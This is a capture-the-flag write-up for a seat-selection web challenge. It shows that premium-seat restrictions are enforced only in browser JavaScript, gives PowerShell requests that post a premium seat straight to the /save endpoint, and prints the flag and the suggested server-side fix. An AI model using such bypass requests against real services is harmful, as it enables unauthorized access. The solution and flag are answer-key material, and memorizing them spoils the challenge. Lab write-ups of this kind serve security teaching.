# CTF Web Challenge — Simon's Seat Selection

## Challenge Description

> You are Simon. Simon must select the optimal seat for his upcoming flight!
>
> Instance: https://simon-c8fd32f1cb46.chall.nnsc.tf

---

## Flag

```
NNS{W3_w1sH_y0U_a_p1e45ant_Fl16Ht_wi7H_nN5_41r}
```

---

## Overview

The challenge presents a flight seat selection web app for **NNS Air**. The page shows a cabin map with different seat tiers:

- **Unavailable** — rows 1–2 and a few specific seats
- **Premium (NNS Air Plus)** — rows 3–4
- **Available** — rows 5–21

There is a hidden `<div class="flag">` section on the page that displays the CTF flag, but only when the user is recognized as an **NNS Air Plus** member. For non-Plus users, it renders `{{FLAG}}` as a raw, un-interpolated template placeholder.

---

## Vulnerability: Client-Side Enforcement Bypass

The intended restriction is that you cannot save a premium seat through the UI. The JavaScript disables the Save button whenever a premium seat is selected:

```js
saveBtn.disabled = seat.dataset.status === 'premium';
```

This check exists **only in the browser**. The backend `/save` endpoint accepts a raw POST request with a JSON body:

```json
{ "seat": "1A" }
```

There is **no server-side validation** to confirm whether the submitted seat is premium or whether the user is entitled to book it. The server simply trusts the client's input, marks the session as NNS Air Plus, and returns:

```json
{ "ok": true, "seat": "1A", "flag": true }
```

On the next page load, the server renders the flag into the HTML for Plus members.

---

## Solution Steps

### 1. Identify the `/save` endpoint

Reading the page source reveals the fetch call made on Save:

```js
const res = await fetch('/save', {
  method: 'POST',
  body: JSON.stringify({ seat: selectedSeat }),
});
```

### 2. Bypass the UI and POST a premium seat directly

Using a session-aware request, POST seat `1A` (a premium row 1 seat) directly to the endpoint, skipping the disabled button entirely:

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$save = Invoke-WebRequest `
    -Uri "https://simon-c8fd32f1cb46.chall.nnsc.tf/save" `
    -Method POST `
    -Body '{"seat":"1A"}' `
    -ContentType "application/json" `
    -UseBasicParsing `
    -SessionVariable session
```

Response:

```json
{"ok": true, "seat": "1A", "flag": true}
```

### 3. Reload the main page with the same session

```powershell
$main = Invoke-WebRequest `
    -Uri "https://simon-c8fd32f1cb46.chall.nnsc.tf" `
    -UseBasicParsing `
    -WebSession $session
```

The server now recognizes the session as a Plus member and renders the flag section:

```html
<p>Flag: <code>NNS{W3_w1sH_y0U_a_p1e45ant_Fl16Ht_wi7H_nN5_41r}</code></p>
```

---

## Root Cause

Access control was enforced exclusively on the client side (JavaScript). The server never verified whether the seat being saved was within the user's tier. Any attacker can craft a direct HTTP request to bypass all UI restrictions.

**Fix:** The server must validate on its end that the submitted seat is not a premium seat before granting the Plus session — or require proper authentication/entitlement before accepting a premium booking.
